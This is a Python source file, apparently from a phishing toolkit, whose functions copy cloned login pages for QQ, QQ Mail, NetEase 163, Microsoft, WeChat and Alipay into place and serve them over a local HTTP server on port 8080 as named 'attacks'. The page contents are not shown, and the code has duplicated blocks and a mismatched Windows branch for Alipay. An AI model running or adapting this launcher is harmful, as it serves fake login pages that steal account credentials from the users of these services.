def lang():
    import os
    openlang = open ("config/lang" , "r+")
    readlang = openlang.read()

    if readlang == "zh-cn": #the language is chinese
        language = "true"
        print(language)
        print("操作系统内核:"+os.name)
    else:  #the language is english
        language = "false"
        print(language)
        print("Options System:"+os.name)

def socialqqattack():
    import os
    lang()
    def oschose():
        if os.name == "posix":
            #Linux
            os.system("cp qq/index.html ./") #copy file to the root content
            os.system("cp qq/index.js ./")
            os.system("cp qq/qqlogon.jpg ./")
            os.system ("python3 -m http.server 8080")

        if os.name == "nt":
            #windows
            os.system ("python -m http.server 8080")
        
        else:
            print("[*]Do no start a http port on your system!")
        
    oschose()
    import social as social 
    social.socialtools()     

def delfilelinux(): #use linux command to delete file
    import os
    os.system("rm -f index.html")
    os.system("rm -f index.js")

def delfilewin(): #use windows cmd to delete file
    import os
    os.system("del /F /S /Q index.html")
    os.system("del /F /S /Q index.js")

def qqmail():
    import os
    lang()
    #qq mail attack
    if os.name == "posix":
        #Linux
        delfilelinux()
        os.system("cp qqmail/index.html ./") #copy file to the root content
        os.system("cp qqmail/index.js ./")
        os.system("cp qqmail/logo.jpeg ./")
        os.system ("python3 -m http.server 8080")
        import social as social 
        social.socialtools()  

    if os.name == "nt":
        #windows
        delfilewin()
        os.system("copy qqmail/index.html ./") #use cmd command
        os.system("copy qqmail/index.js ./")
        os.system("copy qqmail/logo.jpeg ./")
        os.system ("python -m http.server 8080")
        import social as social 
        social.socialtools()
    else:
        print("[*]Do no start a http port on your system!")
        import social as social 
        social.socialtools()    

def netease():
    import os
    lang()
    #qq mail attack
    if os.name == "posix":
        #Linux
        delfilelinux()
        os.system("cp 163/index.html ./") #copy file to the root content
        os.system("cp 163/index.js ./")
        os.system("cp 163/logo.jpeg ./")
        os.system ("python3 -m http.server 8080")
        import social as social 
        social.socialtools()  

    if os.name == "nt":
        #windows
        delfilewin()
        os.system("copy 163/index.html ./") #use cmd command
        os.system("copy 163/index.js ./")
        os.system("copy 163/logo.jpeg ./")
        os.system ("python -m http.server 8080")
        import social as social 
        social.socialtools()
    else:
        print("[*]Do no start a http port on your system!")
        import social as social 
        social.socialtools()  

    import os
    lang()
    #qq mail attack
    if os.name == "posix":
        #Linux
        delfilelinux()
        os.system("cp 163/index.html ./") #copy file to the root content
        os.system("cp 163/index.js ./")
        os.system("cp 163/logo.jpeg ./")
        os.system ("python3 -m http.server 8080")
        import social as social 
        social.socialtools()  

    if os.name == "nt":
        #windows
        delfilewin()
        os.system("copy 163/index.html ./") #use cmd command
        os.system("copy 163/index.js ./")
        os.system("copy 163/logo.jpeg ./")
        os.system ("python -m http.server 8080")
        import social as social 
        social.socialtools()
    else:
        print("[*]Do no start a http port on your system!")
        import social as social 
        social.socialtools()  

def microsoftattack():
    import os
    lang()
    #Microsoft Attack
    if os.name == "posix":
        #Linux
        delfilelinux()
        os.system("cp Microsoft/index.html ./") #copy file to the root content
        os.system("cp Microsoft/index.js ./")
        os.system("cp Microsoft/pass.html ./")
        os.system ("python3 -m http.server 8080")
        import social as social 
        social.socialtools()  

    if os.name == "nt":
        #windows
        delfilewin()
        os.system("copy Microsoft/index.html ./") #use cmd command
        os.system("copy Microsoft/index.js ./")
        os.system("copy Microsoft/pass.html ./")
        os.system ("python -m http.server 8080")
        import social as social 
        social.socialtools()
    else:
        print("[*]Do no start a http port on your system!")
        import social as social 
        social.socialtools()  

    import os
    lang()
    #qq mail attack
    if os.name == "posix":
        #Linux
        delfilelinux()
        os.system("cp 163/index.html ./") #copy file to the root content
        os.system("cp 163/index.js ./")
        os.system("cp 163/logo.jpeg ./")
        os.system ("python3 -m http.server 8080")
        import social as social 
        social.socialtools()  

    if os.name == "nt":
        #windows
        delfilewin()
        os.system("copy 163/index.html ./") #use cmd command
        os.system("copy 163/index.js ./")
        os.system("copy 163/logo.jpeg ./")
        os.system ("python -m http.server 8080")
        import social as social 
        social.socialtools()
    else:
        print("[*]Do no start a http port on your system!")
        import social as social 
        social.socialtools()  

def wechat():
    import os
    lang()
    #wechat attack
    if os.name == "posix":
        #Linux
        delfilelinux()
        os.system("cp wechat/index.html ./") #copy file to the root content
        os.system("cp wechat/index.js ./")
        os.system ("python3 -m http.server 8080")
        import social as social 
        social.socialtools()  

    if os.name == "nt":
        #windows
        delfilewin()
        os.system("copy wechat/index.html ./") #use cmd command
        os.system("copy wechat/index.js ./")
        os.system ("python -m http.server 8080")
        import social as social 
        social.socialtools()
    else:
        print("[*]Do no start a http port on your system!")
        import social as social 
        social.socialtools()  

def alipay():
    import os
    lang()
    #alipay attack
    if os.name == "posix":
        #Linux
        delfilelinux()
        os.system("cp alipay/index.html ./") #copy file to the root content
        os.system("cp alipay/index.js ./")
        os.system("cp alipay/pass.PNG ./")
        os.system("cp alipay/users.PNG ./")
        os.system ("python3 -m http.server 8080")
        import social as social 
        social.socialtools()  

    if os.name == "nt":
        #windows
        delfilewin()
        os.system("copy wechat/index.html ./") #use cmd command
        os.system("copy wechat/index.js ./")
        os.system("copy alipay/pass.PNG ./")
        os.system("copy alipay/users.PNG ./")
        os.system ("python -m http.server 8080")
        import social as social 
        social.socialtools()
    else:
        print("[*]Do no start a http port on your system!")
        import social as social 
        social.socialtools()  